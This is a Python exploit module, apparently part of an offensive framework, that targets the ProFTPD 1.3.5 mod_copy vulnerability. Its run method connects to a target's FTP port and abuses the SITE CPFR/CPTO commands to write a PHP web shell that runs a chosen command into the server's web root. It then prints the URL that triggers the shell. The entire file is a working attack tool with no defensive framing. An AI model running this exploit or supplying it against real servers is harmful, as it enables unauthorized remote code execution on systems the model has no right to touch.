import socket
from core.base_module import BaseModule
from rich.console import Console

class ProftpdModcopyRce(BaseModule):
    """Exploits a command execution vulnerability in ProFTPD 1.3.5's mod_copy."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['', 'The target host IP address.'],
            'RPORT': [21, 'The target FTP port.'],
            'WEB_ROOT': ['/var/www/html', 'The absolute path to the web server root directory.'],
            'CMD': ['id', 'The command to execute.']
        }

    def _send_cmd(self, sock, cmd):
        """Sends a command to the FTP server."""
        sock.sendall(f"{cmd}\\r\\n".encode())
        return sock.recv(1024).decode()

    def run(self, options):
        """
        Executes the ProFTPD mod_copy exploit.
        """
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        web_root = options.get('WEB_ROOT')
        cmd = options.get('CMD')
        console = Console()

        if not rhost or not web_root:
            console.print("[!] RHOST and WEB_ROOT must be set.", style="bold red")
            return

        payload = f"<?php system('{cmd}'); ?>"
        
        console.print(f"[*] Connecting to {rhost}:{rport}...")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(15)
                s.connect((rhost, rport))
                s.recv(1024) # Banner

                console.print("[*] Sending payload via SITE CPFR/CPTO...")
                
                self._send_cmd(s, f"SITE CPFR {payload}")

                dest_file = f"{web_root}/pysploitx_payload.php"
                response = self._send_cmd(s, f"SITE CPTO {dest_file}")

                if "Copy successful" in response:
                    console.print(f"[bold green][+] Payload successfully written to {dest_file}[/bold green]")
                    console.print("[*] You can now trigger the payload by visiting the URL in your browser.")
                    console.print(f"[*]   URL: http://{rhost}/pysploitx_payload.php")
                else:
                    console.print("[!] Failed to write payload. The server may not be vulnerable or the web root is incorrect.", style="bold red")
                    console.print(f"  -> Response: {response.strip()}")

        except socket.timeout:
            console.print(f"[!] Connection to {rhost}:{rport} timed out.", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")